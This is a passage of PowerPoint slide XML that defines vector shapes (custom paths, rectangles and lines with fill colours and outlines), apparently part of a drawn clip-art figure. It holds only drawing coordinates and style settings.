                  <a:pt x="254" y="918"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="236" y="914"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="216" y="908"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="197" y="903"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="179" y="897"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="160" y="891"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="142" y="886"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="125" y="877"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="109" y="870"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="92" y="861"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="85" y="856"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="78" y="852"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="71" y="846"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="64" y="841"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="58" y="835"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="53" y="828"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="47" y="822"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="42" y="815"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="808"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34" y="801"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="793"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="786"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="778"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="770"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="752"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="735"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="716"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="696"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="675"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="654"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="633"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="611"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="588"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="564"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="540"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="515"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="491"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="478"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="464"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="450"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="435"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="418"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="402"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="385"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="368"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="350"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="333"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="297"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="260"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="224"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="207"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="189"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="173"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="156"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="140"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="125"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="110"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="96"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="82"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21" y="70"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="58"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="48"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="37"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="34"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="41" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="43" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="47" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="50" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="54" y="16"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="00ffff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="388" name="CustomShape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3681360" y="4668840"/>
            <a:ext cx="177120" cy="113760"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="112" h="72">
                <a:moveTo>
                  <a:pt x="43" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="72"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="69" y="72"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="112" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="43" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="33cccc"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="389" name="CustomShape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3772080" y="4299120"/>
            <a:ext cx="81720" cy="374040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="33cccc"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="390" name="CustomShape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3683160" y="4405320"/>
            <a:ext cx="111960" cy="374040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="33cccc"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="391" name="CustomShape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3683160" y="4405320"/>
            <a:ext cx="111960" cy="374040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="11160">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:miter/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="392" name="CustomShape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3681360" y="4294080"/>
            <a:ext cx="177120" cy="113760"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="112" h="72">
                <a:moveTo>
                  <a:pt x="43" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="72"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="69" y="72"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="112" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="43" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="33cccc"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="393" name="CustomShape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3681360" y="4294080"/>
            <a:ext cx="177120" cy="113760"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="112" h="72">
                <a:moveTo>
                  <a:pt x="43" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="72"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="69" y="72"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="112" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="43" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="11160">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="394" name="Line 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3859200" y="4303440"/>
            <a:ext cx="1440" cy="365040"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="11160">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="395" name="Line 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="3795480" y="4668480"/>
            <a:ext cx="63720" cy="111240"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="11160">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="396" name="CustomShape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3699000" y="4454640"/>
            <a:ext cx="72360" cy="213480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="3333cc"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="397" name="CustomShape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3699000" y="4454640"/>
            <a:ext cx="72360" cy="213480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="11160">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:miter/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="398" name="CustomShape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3710160" y="4519440"/>
            <a:ext cx="54720" cy="75600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="ffffff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="399" name="CustomShape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2563920" y="4300560"/>
            <a:ext cx="394560" cy="329400"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="249" h="208">
                <a:moveTo>
                  <a:pt x="68" y="27"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="70" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="72" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="73" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="74" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="75" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="79" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="81" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="83" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="86" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="88" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="91" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="95" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="98" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="103" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="107" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="111" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="116" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="121" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="126" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="132" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="137" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="144" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="150" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="157" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="163" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="170" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="178" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="185" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="193" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="201" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="210" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="208" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="210" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="213" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="216" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="220" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="222" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="224" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="226" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="245" y="68"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="240" y="116"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="208" y="132"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="247" y="144"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="247" y="146"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="248" y="148"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="248" y="151"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="249" y="154"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="248" y="159"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="247" y="163"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="244" y="169"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="144" y="208"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="162"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="158"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="149"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="31" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34" y="23"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="40" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="42" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="46" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="49" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="53" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="58" y="23"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="61" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="68" y="27"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="400" name="CustomShape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2701800" y="4324320"/>
            <a:ext cx="124560" cy="143640"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="79" h="91">
                <a:moveTo>
                  <a:pt x="78" y="4"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="78" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="77" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="74" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="72" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="69" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="65" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="60" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="56" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="50" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="44" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="31" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="18"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="47"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="60"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="74"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="87"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="44" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="50" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="57" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="64" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="71" y="90"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="79" y="91"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="79" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="78" y="81"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="77" y="70"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="57"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="77" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="78" y="4"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="333333"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="401" name="CustomShape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2714760" y="4363920"/>
            <a:ext cx="208800" cy="142200"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="132" h="90">
                <a:moveTo>
                  <a:pt x="1" y="67"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="79"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="86" y="90"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="89" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="91" y="87"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="94" y="85"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="98" y="83"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="103" y="79"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="107" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="112" y="71"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="117" y="66"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="121" y="60"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="125" y="55"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="128" y="47"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="131" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="132" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="132" y="23"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="129" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="129" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="128" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="127" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="126" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="124" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="120" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="117" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="113" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="113" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="117" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="118" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="118" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="117" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114" y="51"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="108" y="64"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="107" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="106" y="66"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="105" y="66"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="103" y="67"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="100" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="98" y="70"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="96" y="71"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="92" y="72"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="90" y="72"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="85" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="82" y="73"/>
                </a:lnTo>
